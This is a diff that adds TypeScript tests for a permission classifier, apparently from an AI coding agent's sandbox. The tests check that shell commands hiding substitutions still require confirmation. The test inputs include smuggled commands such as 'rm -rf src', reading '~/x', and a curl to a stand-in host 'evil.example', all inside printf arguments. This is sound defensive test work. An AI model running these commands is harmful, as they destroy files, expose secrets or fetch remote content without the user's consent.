@@ -1244,5 +1244,50 @@ describe('PermissionClassifier', () => {
         await fs.rm(root, { recursive: true, force: true });
       }
     });
+
+    it.each([
+      'printf "$(rm -rf src)" > out.txt',
+      'printf "$(cat ~/x)" > out.txt',
+      'printf $(curl https://evil.example/x) > out.txt',
+      'printf `rm -rf src` > out.txt',
+      'printf "${VAR}" > out.txt',
+      'echo "100$" > out.txt',
+    ])('%s 在围栏可用时仍 ask 不免确认', async (command) => {
+      setOsWriteFenceAvailableOverride(true);
+      const root = await fs.mkdtemp(path.join(os.tmpdir(), 'exectime-expand-'));
+      try {
+        expect(isOsWriteFenceAvailable()).toBe(true);
+        const result = await classifyPermission(
+          'Bash',
+          { command },
+          { workingDirectory: root, workspaceRoot: root, permissionLevel: 'execute' },
+        );
+        expect(result.decision).toBe('ask');
+        expect(result.reason).not.toBe(FENCED_IN_PROJECT_WRITE_REASON);
+      } finally {
+        setOsWriteFenceAvailableOverride(undefined);
+        await fs.rm(root, { recursive: true, force: true });
+      }
+    });
+
+    it('printf x > .env 在 /var↔/private/var 别名项目根下仍 ask', async () => {
+      setOsWriteFenceAvailableOverride(true);
+      try {
+        expect(isOsWriteFenceAvailable()).toBe(true);
+        const result = await classifyPermission(
+          'Bash',
+          { command: 'printf x > .env' },
+          {
+            workingDirectory: '/var/tmp/exectime-proj',
+            workspaceRoot: '/private/var/tmp/exectime-proj',
+            permissionLevel: 'execute',
+          },
+        );
+        expect(result.decision).toBe('ask');
+        expect(result.reason).not.toBe(FENCED_IN_PROJECT_WRITE_REASON);
+      } finally {
+        setOsWriteFenceAvailableOverride(undefined);
+      }
+    });
   });
 });
